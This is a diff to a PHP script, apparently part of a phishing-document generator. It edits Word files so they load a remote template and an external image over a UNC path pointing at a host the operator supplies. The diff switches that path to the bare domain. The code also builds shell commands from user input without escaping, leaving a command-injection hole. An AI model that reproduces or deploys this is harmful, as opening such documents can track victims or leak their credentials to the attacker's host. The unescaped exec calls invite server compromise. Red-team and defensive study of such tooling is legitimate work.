@@ -407,7 +407,7 @@ $cmd18 = "sed -i -e 's~URLVALUE~".stripslashes($URL)."~g' /var/www/uploads/word/
 exec($cmd18,$output18);
 //var_dump($output18);
 
-$settingsxml = file_get_contents("/var/www/uploads/word/settings.xml");
+$settingsxml = file_get_contents("/var/www/uploads/word/_rels/settings.xml");
 
 $pos = strpos($settingsxml, "<w:defaultTabStop");
 
@@ -415,7 +415,7 @@ $before = substr($settingsxml, 0, $pos);
 
 $after = strstr($settingsxml, '<w:defaultTabStop', false);
 
-$settingsfile = "/var/www/uploads/word/settings.xml";
+$settingsfile = "/var/www/uploads/word/_rels/settings.xml";
 $handle = fopen($settingsfile, 'w') or die('Cannot open file:  '.$settingsfile);
 $data = $before."<w:attachedTemplate r:id=\"rId9999\"/>".$after;
 fwrite($handle, $data);
@@ -432,7 +432,9 @@ $cmd4 = 'sed -i -e \'s~media/'.stripslashes($outputcmd2[0]).'\\"~'.stripslashes(
 exec($cmd4,$output4);
 //var_dump($output4);
 
-$cmd5 = 'sed -i -e \'s~media/'.stripslashes($outputcmd2[1]).'\\"~\\\\\\\\'.stripslashes($URL).'/phishingdocs.jpg\\" TargetMode=\\"External\\"~g\' /var/www/uploads/word/_rels/document.xml.rels;';
+$domainonly = parse_url($URL, PHP_URL_HOST);
+
+$cmd5 = 'sed -i -e \'s~media/'.stripslashes($outputcmd2[1]).'\\"~\\\\\\\\'.stripslashes($domainonly).'/phishingdocs.jpg\\" TargetMode=\\"External\\"~g\' /var/www/uploads/word/_rels/document.xml.rels;';
 //$cmd5 = escapeshellcmd($cmd5);
 exec($cmd5,$output5);
 //var_dump($output5);
